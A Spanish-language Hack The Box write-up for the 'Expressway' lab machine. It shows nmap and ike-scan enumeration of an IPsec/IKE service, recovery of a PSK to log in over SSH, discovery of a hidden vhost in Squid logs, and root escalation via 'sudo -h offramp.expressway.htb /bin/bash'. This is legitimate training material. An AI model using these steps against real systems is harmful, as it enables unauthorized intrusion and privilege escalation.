HTB — Expressway

📅 14/06/2026 · ⏱️ 2 min de lectura · 🎯 Dificultad: Easy
HTBLinuxUDPISAKMPsudo abuse

La máquina Expressway presenta un escenario centrado en VPN IPsec/IKE. El acceso inicial se obtiene mediante la enumeración del servicio ISAKMP expuesto por UDP y la recuperación de una clave PSK. Posteriormente, la escalada de privilegios aprovecha una configuración específica de sudo asociada a un host virtual.

Reconocimiento

El escaneo inicial con Nmap mostró únicamente SSH sobre TCP:

nmap expressway.htb -A

22/tcp open ssh OpenSSH 10.0p2 Debian 8

Al no existir más servicios TCP relevantes, se realizó enumeración UDP:

nmap expressway.htb -sU --top-ports 100

68/udp   open|filtered dhcpc
69/udp   open|filtered tftp
500/udp  open          isakmp
4500/udp open|filtered nat-t-ike

El puerto 500/UDP indicaba la presencia de un servicio ISAKMP utilizado por IPsec/IKE para la negociación de túneles VPN seguros.

Enumeración de IKE/IPsec

Utilizando ike-scan se confirmó el servicio y sus parámetros criptográficos:

ike-scan -M expressway.htb

SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK)
VID=(XAUTH)
  • Autenticación mediante PSK (Pre-Shared Key).
  • Cifrado 3DES.
  • Hash SHA1.
  • Diffie-Hellman Group 2 (1024 bits).
  • Soporte para XAUTH.

Posteriormente se lanzó una enumeración en modo agresivo:

ike-scan -P -M -A -n fakeID expressway.htb

La respuesta reveló el identificador:

ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
Hallazgo: Se obtuvo el usuario ike junto con el material necesario para realizar cracking de la PSK.

Acceso inicial

Tras recuperar la clave PSK y completar la autenticación, fue posible establecer acceso al sistema mediante SSH como el usuario ike.

Enumeración local

Se revisaron los grupos del usuario:

id

uid=1001(ike) gid=1001(ike)
groups=1001(ike),13(proxy)

El grupo proxy permitía acceder a directorios relacionados con Squid:

find / -group proxy -type d 2>/dev/null

/run/squid
/var/spool/squid
/var/log/squid

En los registros de acceso apareció un subdominio interesante:

cat access.log.1 | grep htb

GET http://offramp.expressway.htb

Esto reveló la existencia del host virtual offramp.expressway.htb, pieza clave para la escalada.

Escalada de privilegios

Durante la enumeración se observó una versión reciente de sudo: 

sudo -V

Sudo version 1.9.17

Investigando configuraciones relacionadas con nombres de host se probó el parámetro -h apuntando al subdominio descubierto anteriormente: 

sudo -h offramp.expressway.htb -l

La salida mostró permisos completos:

User ike may run the following commands on offramp:
(root) NOPASSWD: ALL
(root) NOPASSWD: ALL
Resultado: El usuario podía ejecutar cualquier comando como root sin contraseña cuando sudo evaluaba las reglas para el host offramp.expressway.htb.

Finalmente:

sudo -h offramp.expressway.htb /bin/bash

Con ello se obtuvo una shell con privilegios de root.

Conclusión

La cadena de ataque combinó enumeración de IKE/IPsec, recuperación de una PSK, acceso como usuario válido y una configuración insegura de sudo basada en hostname. La clave del compromiso fue identificar el subdominio oculto en los logs de Squid y utilizarlo para activar privilegios administrativos completos.
